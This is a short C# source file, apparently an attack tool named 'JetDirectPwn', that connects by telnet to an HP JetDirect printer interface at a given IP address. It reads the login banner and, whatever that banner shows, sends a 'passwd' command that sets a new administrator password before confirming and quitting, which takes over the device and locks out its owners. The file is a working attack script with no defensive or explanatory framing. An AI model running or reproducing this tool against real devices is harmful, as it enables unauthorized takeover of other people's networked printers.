using System;
using System.Diagnostics;
using System.Threading;

namespace JetDirectPwn
{
    public class JetDirectConnection
    {
        private Process process;

        public JetDirectConnection(string ip, int port = 23)
        {
            process = new Process { 
                StartInfo = 
                { 
                    FileName = "/usr/bin/telnet",
                    Arguments = ip,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    ErrorDialog = false
                }
            };

            process.Start();
        }

        public bool Pwn(string pass)
        {
            new Thread(() => checkProcess(process)).Start();

            bool ret = false;
            try
            {
                var standardOutput = process.StandardOutput;
                var standardInput = process.StandardInput;
                standardInput.AutoFlush = true;
                
                standardOutput.ReadLine();
                standardOutput.ReadLine();
                standardOutput.ReadLine();
                standardOutput.ReadLine();
                if (standardOutput.ReadLine().ToLower().StartsWith("password"))
                    ret = true;
                else
                    ret = false;

                Thread.Sleep(2000);
                standardInput.WriteLine(string.Format("passwd {0} {0}", pass));
                Thread.Sleep(500);
                standardInput.WriteLine(string.Format("quit"));
                Thread.Sleep(1000);
                standardInput.WriteLine("Y");
                Thread.Sleep(1000);
            }
            catch
            {
                return ret;
            }
            return ret;
        }

        private void checkProcess(Process process)
        {
            Thread.Sleep(15000);
            try
            {
                process.Kill();
            }
            catch
            {

            }
        }
    }
}

